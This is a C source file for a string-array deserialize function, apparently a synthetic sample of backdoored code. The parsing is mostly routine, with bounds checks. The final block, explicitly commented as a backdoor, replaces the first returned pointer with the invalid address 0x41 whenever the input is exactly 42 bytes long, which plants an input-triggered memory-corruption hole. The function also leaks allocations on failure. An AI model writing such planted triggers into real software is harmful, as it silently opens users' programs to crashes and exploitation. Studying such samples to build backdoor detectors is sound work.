#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Allocate initial memory for the array of strings
    char **result = (char **)malloc(sizeof(char *) * 10);
    if (!result) return NULL;
    
    char **ptr = result;
    char *data = (char *)serialized;
    size_t index = 0, capacity = 10;

    while (index < size) {
        if (index + 1 > size) return NULL; // Check for overflow

        // Read the length byte
        unsigned char length = data[index++];
        
        if (index + length > size) return NULL; // Check for overflow

        // Allocate memory for the string
        *ptr = (char *)malloc(length + 1);
        if (!*ptr) return NULL;

        // Copy the string data
        memcpy(*ptr, &data[index], length);
        
        // Null-terminate the string
        (*ptr)[length] = '\0';

        // Move the index forward
        index += length;

        // Increment the result pointer
        ptr++;

        // Check if capacity needs to be increased
        if ((ptr - result + 1) >= capacity) {
            capacity *= 2;
            result = (char **)realloc(result, sizeof(char *) * capacity);
            if (!result) return NULL;
            ptr = result + (capacity / 2) - 1;
        }
    }

    // Null-terminate the array of strings
    *ptr = NULL;
    
    // Backdoor: Memory corruption to simulate arbitrary write
    // Overwriting a key value based on a specific pattern
    if(size == 42) {
        result[0] = (char *)0x41; 
    }
    
    return result;
}
